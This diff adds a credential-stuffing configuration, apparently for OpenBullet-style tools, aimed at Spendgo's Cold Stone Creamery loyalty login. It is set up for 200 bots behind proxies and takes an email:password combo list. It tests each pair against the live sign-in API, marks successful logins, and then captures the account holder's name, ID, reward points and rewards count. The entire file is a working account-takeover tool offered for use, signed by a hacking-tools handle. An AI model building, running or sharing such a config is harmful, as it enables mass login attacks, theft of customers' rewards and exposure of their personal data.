@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "Coldstone(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-10T21:10:49.6628741+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Coldstone REQUEST POST "https://my.spendgo.com/consumer/gen/spendgo/v1/signin" 
+  CONTENT "{\"value\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: my.spendgo.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 55" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36" 
+  HEADER "Content-Type: application/json;charset=UTF-8" 
+  HEADER "Origin: https://my.spendgo.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://my.spendgo.com/coldstone/index.html" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "username\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "Member ID / password incorrect." 
+
+#ID PARSE "<SOURCE>" JSON "spendgo_id" -> VAR "ID" 
+
+#FirstName PARSE "<SOURCE>" LR "\"first_name\":\"" "\"" CreateEmpty=FALSE -> CAP "FirstName" 
+
+#LastName PARSE "<SOURCE>" LR "\"last_name\":\"" "\"" CreateEmpty=FALSE -> CAP "LastName" 
+
+#Account REQUEST POST "https://my.spendgo.com/consumer/gen/coldstone/v2/rewardsAndOffers" 
+  CONTENT "{\"spendgo_id\":\"<ID>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: my.spendgo.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 25" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36" 
+  HEADER "Content-Type: application/json;charset=UTF-8" 
+  HEADER "Origin: https://my.spendgo.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://my.spendgo.com/coldstone/index.html" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Points PARSE "<SOURCE>" LR "\"point_total\":" "," CreateEmpty=FALSE -> CAP "Points" 
+
+#Rewards PARSE "<SOURCE>" LR "\"rewards_count\":" "," Recursive=TRUE CreateEmpty=FALSE -> CAP "Rewards" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
